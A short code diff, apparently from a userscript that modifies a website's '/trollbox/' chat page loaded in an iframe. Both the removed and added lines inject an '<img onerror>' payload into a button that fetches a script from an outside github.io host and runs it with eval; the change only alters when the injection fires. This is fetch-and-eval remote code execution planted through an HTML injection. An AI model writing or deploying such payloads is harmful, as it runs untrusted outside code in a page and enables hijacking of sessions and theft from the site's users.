@@ -24,9 +24,9 @@
     setInterval(() => {
         if(iframe.contentWindow.location.pathname == '/trollbox/') {
             if(!isTB) {
-                iframe.contentWindow.setTimeout(() => {
-                    iframe.contentDocument.getElementById('trollbox_nick_btn').innerHTML = '<img src=e onerror="fetch(\'https://dell-optiplex-790.github.io/tbjb/tb.js\').then(e=>e.text()).then(eval)">'
-                }, 300);
+                iframe.contentDocument.addEventListener('DOMContentLoaded', function() {
+                    iframe.contentDocument.getElementById('trollbox_nick_btn').innerHTML = '<img src=e onerror="fetch(\'https://dell-optiplex-790.github.io/tbjb/tb.js\').then(e=>e.text()).then(eval)">';
+                });
             }
             isTB = true;
         } else {
